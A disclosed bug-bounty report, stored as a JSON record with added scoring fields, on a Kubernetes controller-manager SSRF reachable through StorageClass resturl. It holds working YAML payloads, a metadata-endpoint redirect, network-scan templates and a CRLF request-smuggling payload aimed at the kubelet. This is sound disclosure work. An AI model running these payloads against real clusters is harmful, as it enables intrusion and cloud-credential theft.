{
  "reported_to": "Kubernetes",
  "reported_by": "reeverzax ",
  "title": "Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.",
  "content": "\nHello,\nWho we are :\nWe\u2019re two French security researchers and our respective names are Brice Augras and\nChristophe Hauquiert, we worked and found the vulnerability together.\nBrice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax\nChristophe Hauquiert - https://hackerone.com/hach\nSummary\nWe recently led some security investigations about Kubernetes product hosted in a managed\nservice.\nBy abusing product vulnerability due to implementation context, we would like to bring to your\nattention technical details about what we found.\nWe started an investigation process on multiple managed k8s offers and found quite each time a Critical\nImpact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .\nWe're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.\nTechnical specification :\nFake vendor name : example.com\nKubernetes release for half-blind SSRF scenario: 1.14\nKubernetes release for complete SSRF vulnerability : up to v1.15.3, v1.14.6 and v1.13.10\nWe don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release.\nAttacker server: https://bzh.ovh (51.38.238.22)\nProvided file with proof of concept scripts: PoC.zip\nPoC.zip (F685902)\nCompromission Scenario\nHere is the main workflow we followed in order to escape from our customer environment on multiple distributors\nproviding k8s managed offer.\nFirstly, we created a k8s cluster on distributors managed k8s service.\nMainly, these vendors use the following infrastructure :\n<image_0>\nAfter configuring kubectl binary, we were able to manage our customer cluster provided by example.com\nWhen creating a persistent volume claim associated with a custom StorageClass on our\ncluster, the provisioning step is handled by the kube/cloud controller manager (depending of the release),\nwe noticed that the process was handled inside vendor internal perimeter.\nWe discovered the existence of a half-blind SSRF vulnerability inside multiple\nStorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.\nThis half-blind SSRF can be used us to scan master VPC network and request the different listening services\n(Metadata instance, Kubelet, ETCD, etc..) based on the kube-controller responses.\nInitially, we were only limited to HTTP POST requests as we were unable to retrieve content of\nbody page if the response code was equal to 200 and not in JSON Content-Type.\nBut we improved our first payload by combining the previous step with a 302 redirect from an\nexternal server in order to convert POST request to GET request.\nIn addition to this, if the managed k8s offer service provider was using an old k8s cluster release AND allowed customer kube-controller-manager logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.\nThis was the attack scenario with the most impact.\nIndeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...\nPoC\nPoC n\u00b01 - Half Blind SSRF\nWhile doing some analysis on glusterFS storage Class Golang source, we noticed that\nthe first HTTP request issued during a Volume creation\n(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), /volumes\nwas appended at the end of the user provided URL in resturl parameter.\nIn order to remove the end of this unwanted path, we used the # trick in the resturl\nparameter.\nHere is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:\nCode 690 Bytes\n1apiVersion: storage.k8s.io/v1\n2kind: StorageClass\n3metadata:\n4name: poc-ssrf\n5provisioner: kubernetes.io/glusterfs\n6parameters:\n7resturl: \"http://bzh.ovh:6666/#\"\n8clusterid: \"630372ccdc720a92c681fb928f27b53f\"\n9restauthenabled: \"true\"\n10restuser: \"admin\"\n11secretNamespace: \"default\"\n12secretName: \"poc-ssrf-secret\"\n13gidMin: \"40000\"\n14gidMax: \"50000\"\n15volumetype: \"replicate:3\"\n16---\n17apiVersion: v1\n18data:\n19key: bXlwYXNzd29yZA==\n20kind: Secret\n21metadata:\n22name: poc-ssrf-secret\n23namespace: default\n24type: kubernetes.io/glusterfs\n25---\n26apiVersion: v1\n27kind: PersistentVolumeClaim\n28metadata:\n29name: poc-ssrf\n30spec:\n31accessModes:\n32- ReadWriteOnce\n33volumeMode: Filesystem\n34resources:\n35requests:\n36storage: 8Gi\n37storageClassName: poc-ssrf\nWe executed the payload with kubectl binary, and the kube-controller-manager handled the\ncreation process and HTTP request:\nCode 28 Bytes\n1kubectl create -f sc-poc.yam\nThe attacker server was put in listening mode on port 6666 in order to handle incoming\nPOST requests and verify that how the URL could be arbirary controlled by an attacker:\n<image_1>\nPoC n\u00b02 : Redirecting POST to GET HTTP request trick\nThe first request issued by Glusterfs client was a POST type, by doing the following steps,\nwe were able to convert POST request to GET:\n\u2022 Storage class uses http://bzh.ovh/redirect.php# as resturl parameter\n\u2022 https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the\nfollowing Location Header http://169.254.169.254 (could be any other internal\nresource, this redirected url is used for example purposes)\n\u2022 As by default Golang net/http library follows redirection and convert POST to GET\nwith 302 return code, the targeted resource is then requested with a HTTP GET request.\nWe were able to read HTTP response body on some requests by describing persistent\nvolume claim object:\nCode 24 Bytes\n1kubectl describe pvc xxx\nOr, getting events from Kubernetes cluster with command below:\nCode 17 Bytes\n1kubectl get event\nHere is an example of JSON response we were able to retrieve :\n<image_2>\nThe exploitation process of our vulnerability at this moment was limited due to the\nfollowing elements:\nWe were not able to inject HTTP headers in the emitted request\nWe were not able to perform POST HTTP Request with body parameters (useful to request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)\nWe were not able to retrieve response body content when HTTP return code was 200 and not a JSON Content-Type response.\nPoC n\u00b03 : Managed cluster Lan scanning and sensitive data exposure\nAt least, as we had the possibility to scan LAN resources, the next step was automation.\nIndeed, in order to scan one IP address and one port we had to realize the following tasks:\nDelete previous tested Storage Class\nDelete previous tested Persistent Volume Claim\nChange IP and PORT in sc.yaml\nCreate Storage Class with new IP and port\nCreate new Persistent Volume Claim Since the way to scan for one resource was very specific and incompatible with traditional SSRF exploitation tools or scanners, we decided to create some kind of custom workers in bash script. In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers. The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range.\nEach worker was launched the following command:\n<image_3>\nHere are two additional YAML files that needs to be in the same directory as scanner.sh Bash\nscript:\nCode 353 Bytes\n1apiVersion: storage.k8s.io/v1\n2kind: StorageClass\n3metadata:\n4name: {{SC_NAME}}\n5provisioner: kubernetes.io/glusterfs\n6parameters:\n7resturl: \"http://{{URL}}#\"\n8clusterid: \"630372ccdc720a92c681fb928f27b53f\"\n9restauthenabled: \"true\"\n10restuser: \"admin\"\n11secretNamespace: \"default\"\n12secretName: \"heketi-secret\"\n13gidMin: \"40000\"\n14gidMax: \"50000\"\n15volumetype: \"replicate:3\"\nAbove is the content of template_sc.yaml\nCode 193 Bytes\n1apiVersion: v1\n2kind: PersistentVolumeClaim\n3metadata:\n4name: {{PVC_NAME}}\n5spec:\n6accessModes:\n7- ReadWriteOnce\n8volumeMode: Filesystem\n9resources:\n10requests:\n11storage: 8Gi\n12storageClassName: {{SC_NAME}}\nAbove is the content of template_pvc.yaml\nPoC n\u00b04 : CRLF + smuggling HTTP injection in old Kubernetes cluster releases\nIn addition to all the previous steps, we found a more efficient way to retrieve full HTTP\nresponse body content in addition to craft complete HTTP requests that were user controlled.\nUnfortunately, the vulnerability requires the following prerequisites:\nKube Controller Manager logs reachable by the customer\nKubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)\nWe still wan't to bring this attack scenario with a PoC as some providers still have some\ncustomers using one of these \u201cdeprecated\u201d k8s release.\nWe realized a first PoC in a local environment to demonstrate the vulnerability.\nHere are some technical details about them:\nWe discovered a vulnerability was existing for the following Golang releases <1.12\n(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF\nattacks.\nBy combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete\ncrafted requests, including custom headers, HTTP method, parameters and data that were\ngoing to be executed by the kube-controller-manager.\nIn addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource.\nWe deployed a local environment simulating Kubernetes exchanges between the GlusterFS\nGo client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).\nHere is an example of a working StorageClass resturl parameter payload performing an HTTP\nsmuggling attack + CRLF during provisioning step in order to leak response content in kube-\ncontroller logs:\nHere is an example of a working StorageClass resturl parameter payload allowing to perform this kind of attack scenario :\nCode 181 Bytes\n1http://172.31.X.1:10255/healthz? HTTP/1.1\\r\\nConnection: keep-\n2alive\\r\\nHost: 172.31.X.1:10255\\r\\nContent-Length: 1\\r\\n\\r\\n1\\r\\nGET /pods? HTTP/1.1\\r\\nHost: 172.31.X.1:10255\\r\\n\\r\\n\nHere is the complete HTTP response that was leaking inside the lube-controller-manage logs :\n<image_4>\nImpact\nImpact Analysis\nThis was quite hard for us to evaluate how hard the impact was for these two attack vectors.\nIndeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.\nFeel free to exchange with us about the CVSS score about you consider for this vulnerability as this seems to be related to managed context k8s environment.\nFrom the various distributors we led research on, we noticed that this could lead to the following impact analysis :\nIntegrity\nLateral movement with cloud steal credentials (from metadata API)\nRemote command execution by using these credentials\nReproducing above scenario in an IDOR way with other resources discovered in LAN area.\nConfidentiality\nInformation gathering by LAN scannin (ssh version, http server versions, ...)\nInstances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)\nCustomers data leak, by using cloud credentials\nAvailability\nAll the post-exploitation scenarios about integrity attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable.\nIndeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.\nBest Regards,\nBrice Augras from @Groupe-Asten\nChristophe Hauquiert\n\n",
  "severity": [
    8.8,
    null
  ],
  "bounty": 5000,
  "weaknesses": [
    "Server-Side Request Forgery (SSRF)"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o3coTnW5jynaDXScVGceDuT5?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222838Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=883fece2f81de0291b3ec09f15765dc1706092876decf2d2d78a9625ac0bd433",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3ZSYftaTxURTiyUDpH5C4FG2?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222838Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b04171ca8d69e6a0d4eef20a65b4aea42e3a318f300b2436a0da94c831c7dd0",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GsX24cJ33LhFGNPqX6ZgBXc7?response-content-disposition=attachment%3B%20filename%3D%22json_response.png%22%3B%20filename%2A%3DUTF-8%27%27json_response.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222838Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0b2f36138f83bcc08f3cff91d61c63501e89a3bd40ff0205cf78b7cd53720c6e",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/of7o9uN5nbDT3TebpV9ALSU4?response-content-disposition=attachment%3B%20filename%3D%22worker.png%22%3B%20filename%2A%3DUTF-8%27%27worker.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222838Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=724e02cc792bdb22e4d1b82ccbdf12ee4091d8f9427f8ec857a825fb0282a8cb",
    "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uCt2ysr2iux5BkSorDkvovZp?response-content-disposition=attachment%3B%20filename%3D%22CRLF.png%22%3B%20filename%2A%3DUTF-8%27%27CRLF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222838Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b701fc2fcc28cb1f19f33f07add268b40b45d7fa393a3cde33ae0cd187b06ed2"
  },
  "disclosed_date": 1604108220,
  "report_url": "https://hackerone.com/reports/776017",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Create a k8s cluster on a managed k8s service and configure kubectl binary."
    ],
    [
      2,
      "Create a StorageClass with a crafted resturl parameter pointing to an attacker-controlled server (e.g., http://bzh.ovh:6666/#)."
    ],
    [
      3,
      "Create a PersistentVolumeClaim associated with the crafted StorageClass."
    ],
    [
      4,
      "Observe the HTTP request from the kube-controller-manager to the attacker-controlled server."
    ],
    [
      5,
      "Use a 302 redirect from the attacker server to convert the POST request to a GET request and target internal resources (e.g., metadata API)."
    ],
    [
      6,
      "Automate the scanning of internal network ranges by creating and deleting StorageClasses and PersistentVolumeClaims with different IPs and ports."
    ],
    [
      7,
      "For full SSRF, exploit older k8s versions with Golang <1.12 to perform HTTP smuggling/CRLF attacks and leak full HTTP responses in kube-controller-manager logs."
    ]
  ],
  "vuln_description": "A half-blind SSRF vulnerability in kube/cloud-controller-manager in managed Kubernetes services can be exploited to scan internal networks and interact with internal services. By crafting StorageClass configurations, an attacker can trigger HTTP requests from the controller to arbitrary URLs, including internal services. In older Kubernetes versions, this can be upgraded to a full SSRF with HTTP smuggling/CRLF attacks, allowing complete control over HTTP requests and responses.",
  "reason": "This vulnerability involves multiple complex steps, including understanding Kubernetes StorageClass provisioning, crafting malicious YAML files, leveraging HTTP redirects, and automating internal network scanning. The attack also requires knowledge of HTTP smuggling/CRLF vulnerabilities in older Golang versions and the ability to manipulate kube-controller-manager logs. The interaction between these components is subtle and non-obvious, making the discovery and exploitation highly complex.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}